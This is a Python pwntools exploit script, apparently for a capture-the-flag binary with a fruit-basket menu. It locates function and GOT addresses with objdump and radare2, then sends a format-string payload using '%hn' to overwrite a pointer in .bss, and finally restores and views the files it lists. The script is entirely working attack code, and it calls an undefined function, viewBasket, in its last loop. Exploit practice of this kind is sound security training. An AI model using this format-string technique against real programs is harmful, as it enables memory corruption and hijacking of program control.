from pwn import *
import r2pipe

def free(idx):
    io.sendlineafter(">> ",'4')
    io.sendlineafter("id : ",str(idx))

def view():
    io.sendlineafter(">> ",'2')


def add(size,tag):
    io.sendlineafter(">> ",'3')
    io.sendlineafter("add\n",'1')
    io.sendlineafter("tag : ",str(size))
    io.sendlineafter("Fruit : ",tag)

def create_basket(payload):
    io.sendlineafter(">> ",'1')
    io.sendlineafter("basket : ",payload)

def restore(filename):
    io.sendlineafter(">> ",'6')
    io.sendlineafter("tag : ",filename)

io=process("./bin{}".format(sys.argv[1]))

proc = subprocess.Popen(["objdump -M intel -d bin{} | grep '<viewWarehouse>'".format(sys.argv[1])], stdout=subprocess.PIPE ,shell = True)
(out ,err) = proc.communicate()
view_warehouse = int(out[:16],16)

log.info("view_warehouse = " + hex(view_warehouse))
create_basket('a'*0x8)

proc = subprocess.Popen(["objdump -R bin{} | grep 'printf'".format(sys.argv[1])], stdout = subprocess.PIPE , shell = True)
(out, err)  = proc.communicate()
printf_got = int(out[:16],16)
write = int(hex(view_warehouse)[-4:],16)

r = r2pipe.open('bin{}'.format(sys.argv[1]))
r.cmd('aaaa')
r.cmd('s sym.viewBasket')
r.cmd('so 18')
bss = int(r.cmd('pd 1').split()[6].strip("[").strip("]"),16)

payload = ('%' + str(write) + 'c' + '%12$hn').ljust(16,'a') + p64(bss)
add(0x50,payload)
view()
free(0)
view()
io.recvuntil("-")
io.recvuntil("baskets:")
f = io.recvall()
files = f.splitlines()

log.info(files)

for i in range(len(files)):
    log.info(files[i])
    restore(files[i])
    viewBasket()

io.close()
